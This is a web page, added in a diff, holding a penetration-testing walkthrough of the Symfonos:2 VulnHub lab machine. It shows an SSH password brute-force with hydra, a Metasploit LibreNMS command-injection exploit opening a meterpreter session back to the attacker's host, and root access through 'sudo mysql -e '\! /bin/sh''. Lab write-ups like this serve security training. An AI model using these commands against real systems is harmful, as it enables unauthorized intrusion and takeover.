@@ -1,0 +1,100 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Symfonos:2 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/symfonos2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-07-20T01:33:15+00:00">July 20, 2019</time><time class="updated" datetime="2025-06-10T20:11:33+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to take another CTF challenge from the series of Symfonos. The credit for making this VM machine goes to “Zayotic” and it is another boot2root challenge where we have to root the server and capture the flag to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/symfonos-2,331/">here</a></strong>.</span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ol>
+<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">NMAP</span></li>
+</ul>
+<ol start="2">
+<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Enum4Linux</span></li>
+</ul>
+<ol start="3">
+<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Smbclient</span></li>
+<li><span style="color: #000000;">Hydra</span></li>
+<li><span style="color: #000000;">Msfconsole</span></li>
+</ul>
+<ol start="4">
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Exploiting Sudo rights</span></li>
+</ul>
+<h3><span style="color: #000000;">Walkthrough:</span></h3>
+<p><span style="color: #000000;"><strong>Scanning:</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with the scanning process. This target VM took the IP address of 192.168.1.102 automatically from our local wifi network.</span></p>
+<p><span style="color: #000000;">Then we used Nmap for port enumeration. We found that port 21,22, 80,139 and 445 are open.</span></p>
+<pre class="lang:default decode:true">nmap –A 192.168.1.102</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-exJPUjaDKO8/XTJtFJAR72I/AAAAAAAAfVA/8_lakV__wlcwP2Tnw9K7fJwJOU2iocK6ACLcBGAs/s1600/1.png"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Enumeration:</strong></span></h3>
+<p><span style="color: #000000;">As port 80 is open, we tried to open the IP address in our browser but we didn’t find anything useful on the webpage. We also tried dirb and other directory brute-forcing tools but couldn’t find anything.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YgYgj1OezIY/XTJtF-FPajI/AAAAAAAAfVM/6WtjP3oL73QJdaRq-YlPzKqoOIvTY2qsQCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">For further enumeration, we used <strong>Enum4Linux</strong> tool and found some useful information. </span><span style="color: #000000;">We found a shared directory named <strong>anonymous.</strong></span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-9rYcRoluD0Y/XTJtGIMXd3I/AAAAAAAAfVI/Yrwd3xlhtNoKiH3_ZWAEzMssxXleiSNhwCLcBGAs/s1600/3.png"/></strong></span></p>
+<p><span style="color: #000000;">To confirm our finding we took the help of smbclient with an empty password to list the shared resources of the target machine and got the same result.</span></p>
+<p><span style="color: #000000;">Inside the anonymous directory, there is another directory named backups. Inside the backups directory, we got a log.txt file. So we downloaded the same file with get command.</span></p>
+<pre class="lang:default decode:true">smbclient –L 192.168.1.102
+smbclient //192.168.1.102/anonymous
+ls
+cd backups
+get log.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-QvuvlRSmu2Y/XTJtGfz9h5I/AAAAAAAAfVQ/EwV-aHX0bPcAyKr-BCu2nq7_w_8SXDnVQCLcBGAs/s1600/4.png"/></strong></span></p>
+<p><span style="color: #000000;">After opening the log.txt file in our local machine we got a username <strong>aeolus</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sKt9m3ReH_w/XTJtHAvyExI/AAAAAAAAfVU/n7cV76y5nMA2VDTKdnREhqntM8vHfHuGQCLcBGAs/s1600/5.1.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation:</strong></span></h3>
+<p><span style="color: #000000;">So far we have got a username <strong>aeolus, </strong>so we tried to bruteforce it with <strong>hydra </strong>and after a long wait we successfully got a password <strong>sergiotaemo.</strong></span></p>
+<pre class="lang:default decode:true ">hydra –l aeolus –P /usr/share/wordlists/rockyou.txt 192.168.1.102 ssh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7IKP303feh4/XTJtHebYj4I/AAAAAAAAfVY/uGBhPKzxAKw-Hup3PgPYaUT_mO-Klv-3gCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Now we have a username and a password and we already know that there ssh<strong> </strong>service running on the target machine. We tried to ssh login the target using msfconsole and were successfully able to do so.</span></p>
+<pre class="lang:default decode:true">use auxiliary/scanner/ssh/ssh_login
+set rhosts 192.168.1.102
+set username aeolus
+set password sergiotaemo
+exploit</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Er3xHwQV0Yo/XTJtHkH_cVI/AAAAAAAAfVc/BpiChQuc7MotvxYy_N4hNqpMELUEKFa7ACLcBGAs/s1600/6.png"/></strong></span></p>
+<p><span style="color: #000000;">From the <strong>ifconfig </strong>command, we got a little hint that the target machine is listening on the localhost IP only.</span></p>
+<p><span style="color: #000000;">So we used <strong>netstat </strong>command to check for the IP address and ports the target machine is listening on and found that web service (8080) is allowed for localhost only.</span></p>
+<p><span style="color: #000000;">So what we did is we used port forwarding to access the port 8080 of the target.</span></p>
+<pre class="lang:default decode:true">netstat
+portfwd add -l 1234 –p 8080 –r 127.0.0.1</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-2ks0SRgQPkI/XTJtH6K7o-I/AAAAAAAAfVg/MDWCzlL0Ep0T3a2rAbeQx_IermRdbaJAgCLcBGAs/s1600/7.png"/></strong></span></p>
+<p><span style="color: #000000;">After that, we were able to access the web service running on port 8080. On the webpage, we found it is running a <strong>LibreNMS </strong>web application.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-s35krxQgwdc/XTJtIU9PF3I/AAAAAAAAfVk/bnZ_jnnjWEke1kYvKpwzx6AYhVXeG3CkwCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">We searched for any exploit available for the LibreNMS application in Metasploit and found one command injection exploit available.</span></p>
+<p><span style="color: #000000;">Using this exploit we were able to get a meterpreter session of the user <strong>LibreNMS.</strong></span></p>
+<pre class="lang:default decode:true">use exploit/linux/http/libre_addhost_cmd_inject
+set rhosts 127.0.0.1
+set rport 1234
+set lhost 192.168.1.103
+set username aeolus
+set password sergiotaemo
+exploit</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-x5qRVazVXCI/XTJtIvkD7aI/AAAAAAAAfVo/-ojdTm2meZIgkGJN4vsTt_W7ltb7i6HGQCLcBGAs/s1600/9.png"/></strong></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
+<p><span style="color: #000000;">To get to the root shell we checked for the sudoer permissions for the <strong>librenms</strong> user and found that this user can run <strong>mysq</strong>l command with no password. So we leveraged this to our advantage and run /bin/sh to get the <strong>root shell.</strong></span></p>
+<p><span style="color: #000000;">Once we got the root shell we traversed to the root directory and opened the <strong>proof.txt </strong>file to complete the challenge.</span></p>
+<pre class="lang:default decode:true">sudo –l
+sudo mysql -e '\! /bin/sh'
+id
+cd /root
+cat proof.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ye0NGWg9Q1c/XTJtFOMM4zI/AAAAAAAAfVE/q6vlnBlouUI5vgPyXvIQ1cPuBlUQ65QxACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
